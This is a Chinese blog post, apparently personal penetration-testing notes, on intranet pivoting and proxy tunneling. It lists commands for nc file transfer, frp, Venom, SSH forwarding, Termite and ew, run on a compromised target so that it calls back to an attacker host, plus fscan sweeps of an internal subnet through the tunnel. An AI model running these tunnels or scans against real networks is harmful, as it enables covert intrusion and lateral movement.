@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="介绍一些工具 nc传文件先启动接受命令 12nc -l -p 9995 &gt;filenc 10.0.1.162 9995 &lt; file  先启动发送命令 12nc -l -p 9992 &lt;test.mvnc 10.0.1.162 9992 &gt;test2.mv  frp下载地址 https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases frpc.i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网代理穿透">
+<meta property="og:url" content="http://example.com/2023/10/22/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="介绍一些工具 nc传文件先启动接受命令 12nc -l -p 9995 &gt;filenc 10.0.1.162 9995 &lt; file  先启动发送命令 12nc -l -p 9992 &lt;test.mvnc 10.0.1.162 9992 &gt;test2.mv  frp下载地址 https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases frpc.i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/10/22/e4495b7af1fe5a62.png">
+<meta property="article:published_time" content="2023-10-22T10:03:41.000Z">
+<meta property="article:modified_time" content="2023-10-24T13:47:14.770Z">
+<meta property="article:author" content="小zhou">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/10/22/e4495b7af1fe5a62.png">
+
+<link rel="canonical" href="http://example.com/2023/10/22/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>内网代理穿透 | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/22/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网代理穿透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-22 18:03:41" itemprop="dateCreated datePublished" datetime="2023-10-22T18:03:41+08:00">2023-10-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-24 21:47:14" itemprop="dateModified" datetime="2023-10-24T21:47:14+08:00">2023-10-24</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>829</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+         <span id="more"></span>
+
+<p>介绍一些工具</p>
+<h2 id="nc传文件"><a href="#nc传文件" class="headerlink" title="nc传文件"></a>nc传文件</h2><p>先启动接受命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 9995 &gt;file</span><br><span class="line">nc 10.0.1.162 9995 &lt; file</span><br></pre></td></tr></table></figure>
+
+<p>先启动发送命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 9992 &lt;test.mv</span><br><span class="line">nc 10.0.1.162 9992 &gt;test2.mv</span><br></pre></td></tr></table></figure>
+
+<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<p>frpc.ini,上传文件</p>
+<p>运行chmod +x frps</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br><span class="line">./frps -c frps.ini</span><br><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 101.43.182.125</span><br><span class="line">server_port = 5000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin=socks5</span><br><span class="line">[ssh]</span><br><span class="line">#代理类型</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000 </span><br></pre></td></tr></table></figure>
+
+<p>服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 5000</span><br></pre></td></tr></table></figure>
+
+<p>通过vps 代理扫描内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan64.exe -h 192.168.216.0/24 -proxy http://101.43.182.125:5000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.bmp.ovh/imgs/2023/10/22/e4495b7af1fe5a62.png"></p>
+<h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>下载地址，一般一次性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Dliv3/Venom/releases</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999     # 攻击机开启监听</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.1.100 -rport 9999 </span><br></pre></td></tr></table></figure>
+
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="ssh正向代理"><a href="#ssh正向代理" class="headerlink" title="ssh正向代理"></a>ssh正向代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [本地IP可省略:][本地端口]:[服务器C地址]:[服务器C端口] [SSH服务器IP] -p [非默认端口22]</span><br><span class="line">如果使用的是默认SSH端口22 ,则&quot;-p 端口&quot;不用输入.</span><br><span class="line">ssh -L 8001:10.0.0.1:8001 username@115.13.13.1 -p 22</span><br><span class="line">ssh -L 8001:192.168.8.140:80 root@192.168.10.131</span><br><span class="line">这样在访问本机的8001端口,通过SSH服务器B端口转发后,实际访问的就是服务器C的8001端口.</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh反向代理"><a href="#ssh反向代理" class="headerlink" title="ssh反向代理"></a>ssh反向代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [SSH服务器IP:][SSH服务器上端口]:[客户端侧IP或能访问到的IP]:[客户端侧IP端口或能反问的IP的端口] 用户名@SSH服务器IP -p SSH服务器端口</span><br><span class="line">ssh -R 192.168.0.107 81:127.0.0.1:80 username@192.168.0.107 -p 2200</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="termite"><a href="#termite" class="headerlink" title="termite"></a>termite</h2><p>原项目已经下架，但依然还有上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/idlefire/Termite</span><br></pre></td></tr></table></figure>
+
+<p>-l 指定本地socks端口,等待远程连-c 指定远程socks机器ip-p 指定远程socks机器端口</p>
+<h3 id="目标在内网，能出网"><a href="#目标在内网，能出网" class="headerlink" title="目标在内网，能出网"></a>目标在内网，能出网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）在vps运行：agent_win32.exe -l 8888</span><br><span class="line"></span><br><span class="line">（2）在自己机器运行：admin_win32.exe -c vps_ip -p 8888</span><br><span class="line"></span><br><span class="line">（3）在目标机器运行：agent_win32.exe -c vps_ip -p 8888</span><br></pre></td></tr></table></figure>
+
+<h3 id="目标在内网，不能出网"><a href="#目标在内网，不能出网" class="headerlink" title="目标在内网，不能出网"></a>目标在内网，不能出网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a.在vps运行：agent_win32.exe -l 8888</span><br><span class="line"></span><br><span class="line">b.在PC运行：admin_win32.exe -c vps_ip -p 8888</span><br><span class="line"></span><br><span class="line">c.在出网机器A运行：agent_win32.exe -c vps_ip -p 8888</span><br><span class="line"></span><br><span class="line">d.在目标B运行：agent_win32.exe -l 9000</span><br><span class="line"></span><br><span class="line">e.在PC运行：goto A_id → connect B_ip 9000</span><br></pre></td></tr></table></figure>
+
+<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/idlefire/ew</span><br></pre></td></tr></table></figure>
+
+<h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><p>先在攻击机【自己】执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>
+
+<p>然后再在靶机上上传对应工具之后执行以下命令【192.168.1.104为攻击机IP】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.1.104 -e 1234</span><br></pre></td></tr></table></figure>
+
+<p>然后攻击机上显示resocks cmd_socket OK即说明代理成功，然后走socks5代理1080端口即可。</p>
+<h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><p>上面进行反向连接是因为出网，而对于不出网这个时候就需要正向连接了</p>
+<p>攻击机使用以下命令【3080就是socks5代理对应的本地端口】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s lcx_listen -l 3080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>然后靶机执行以下命令【执行这个命令理论上是没有回显，但是也是执行了的，不用管】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p>显然只到这里的时候可以看出来这里俩命令并没有产生关联，没错，还需要利用边缘机</p>
+<p>对边缘机使用以下命令【192.168.1.104是攻击机IP，192.168.183.134是不出网主机的IP】</p>
+<blockquote>
+<p>怎么说呢，这里其实也算是利用边缘机将不出网机器和攻击机之间建立隧道，或者也叫所谓的代理。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s lcx_slave -d 192.168.1.104 -e 8888 -f 192.168.183.134 -g 9999</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf  </span><br><span class="line">socks4  192.168.0.199 1080</span><br></pre></td></tr></table></figure>
+
+<h2 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h2><p><a target="_blank" rel="noopener" href="https://augustdoit.men/proxifier/">Proxifier汉化版使用教程 | augustdoit博客</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>三天饿九顿，讨点饭吃。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="小zhou 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="小zhou 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/20/java%E5%AD%A6%E4%B9%A0/" rel="prev" title="java学习">
+      <i class="fa fa-chevron-left"></i> java学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/23/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="next" title="python沙盒">
+      python沙盒 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#nc%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">nc传文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#frp"><span class="nav-number">2.</span> <span class="nav-text">frp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Venom"><span class="nav-number">3.</span> <span class="nav-text">Venom</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh"><span class="nav-number">4.</span> <span class="nav-text">ssh</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">ssh正向代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="nav-number">4.2.</span> <span class="nav-text">ssh反向代理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#termite"><span class="nav-number">5.</span> <span class="nav-text">termite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E5%9C%A8%E5%86%85%E7%BD%91%EF%BC%8C%E8%83%BD%E5%87%BA%E7%BD%91"><span class="nav-number">5.1.</span> <span class="nav-text">目标在内网，能出网</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E5%9C%A8%E5%86%85%E7%BD%91%EF%BC%8C%E4%B8%8D%E8%83%BD%E5%87%BA%E7%BD%91"><span class="nav-number">5.2.</span> <span class="nav-text">目标在内网，不能出网</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ew"><span class="nav-number">6.</span> <span class="nav-text">ew</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">6.0.1.</span> <span class="nav-text">反向连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">6.0.2.</span> <span class="nav-text">正向连接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proxychains"><span class="nav-number">7.</span> <span class="nav-text">proxychains</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Proxifier"><span class="nav-number">8.</span> <span class="nav-text">Proxifier</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小zhou"
+      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+  <p class="site-author-name" itemprop="name">小zhou</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小zhou</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">87k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:16</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
